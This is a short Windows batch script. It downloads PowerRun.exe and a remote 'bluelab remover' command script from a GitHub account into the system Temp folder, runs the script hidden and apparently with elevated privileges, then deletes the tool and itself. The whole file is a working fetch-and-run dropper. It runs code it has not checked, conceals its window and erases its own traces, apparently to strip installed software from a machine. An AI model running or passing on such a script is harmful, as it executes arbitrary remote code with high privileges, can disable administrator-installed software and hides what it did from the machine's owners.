@echo off
powershell Invoke-WebRequest -Uri "https://github.com/saawkt/files/raw/refs/heads/main/PowerRun.exe" -OutFile "C:\Windows\Temp\powerrun.exe"
powershell Invoke-WebRequest -Uri "https://github.com/saawkt/bluelab-remover/raw/refs/heads/main/mstech-bluelab_remover.cmd" -OutFile "C:\Windows\Temp\mstech-bluelab_remover.cmd"
cd /d C:\Windows\Temp >nul 2>&1 
powerrun.exe /SW:0 mstech-bluelab_remover.cmd
del /f /q powerrun.exe >nul 2>&1
start /b "" cmd /c del "%~f0"&exit /b

